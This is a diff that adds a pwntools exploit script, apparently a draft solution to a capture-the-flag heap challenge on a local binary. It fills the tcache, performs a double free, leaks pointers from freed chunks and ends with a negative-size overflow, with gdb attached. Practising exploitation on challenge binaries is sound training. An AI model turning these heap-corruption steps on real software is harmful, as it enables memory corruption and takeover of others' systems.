@@ -1,0 +1,106 @@
+from pwn import *
+
+
+def add_data(size, data):
+    r.sendline(b'1')
+    r.sendline(str(size).encode())
+    r.sendline(data)
+
+def del_data(idx):
+    r.sendline(b'2')
+    r.sendline(str(idx).encode())
+
+r = process('./chall')
+
+pid = gdb.attach(r, gdbscript='''
+                 break *__isoc99_scanf
+
+                 ''')
+
+#fill up tcache first
+for i in range(8):
+    add_data(8,b'A'*8)
+
+for i in range(7):
+    del_data(i)
+
+for i in range(3):
+    add_data(8,b'B'*8)
+
+del_data(0)
+del_data(1)
+del_data(0)
+r.sendline(b'2')
+r.sendline(b'0')
+
+r.sendline(b'2')
+r.sendline(b'1')
+
+r.sendline(b'2')
+r.sendline(b'0')
+
+r.sendline(b'1')
+r.sendline(b'8')
+r.sendline(b'C'*8)
+
+r.sendline(b'1')
+r.sendline(b'8')
+r.sendline(b'D'*8)
+
+r.sendline(b'1')
+r.sendline(b'8')
+r.sendline(b'E'*8)
+
+r.sendline(b'1')
+r.sendline(b'8')
+r.sendline(b'F'*8)
+
+r.sendline(b'1')
+r.sendline(b'8')
+r.sendline(b'G'*8)
+
+r.sendline(b'1')
+r.sendline(b'8')
+r.sendline(b'H'*8)
+
+#r.sendline(b'3')
+
+r.interactive()
+
+
+r.sendline(b'1')
+r.sendline(b'8')
+r.sendline(b'I'*8)
+
+r.sendline(b'2')
+r.sendline(b'8')
+
+r.sendline(b'3')
+r.recvuntil(b'Index 6: HHHHHHHH')
+print("stop")
+addr = u64(r.recv(8))
+
+print(hex(addr))
+
+r.sendline(b'1')
+r.sendline(b'8')
+r.sendline(b'J'*8)
+
+r.sendline(b'2')
+r.sendline(b'8')
+
+r.sendline(b'3')
+r.recvuntil(b'Index 6: ')
+addr2 = u64(r.recv(6)+b'\x00\x00')
+print(hex(addr2))
+
+r.sendline(b'1')
+r.sendline(b'8')
+r.sendline(b'K'*8)
+
+r.sendline(b'1')
+r.sendline(b'-1')
+r.sendline(b'L'*100)
+
+r.interactive()
+
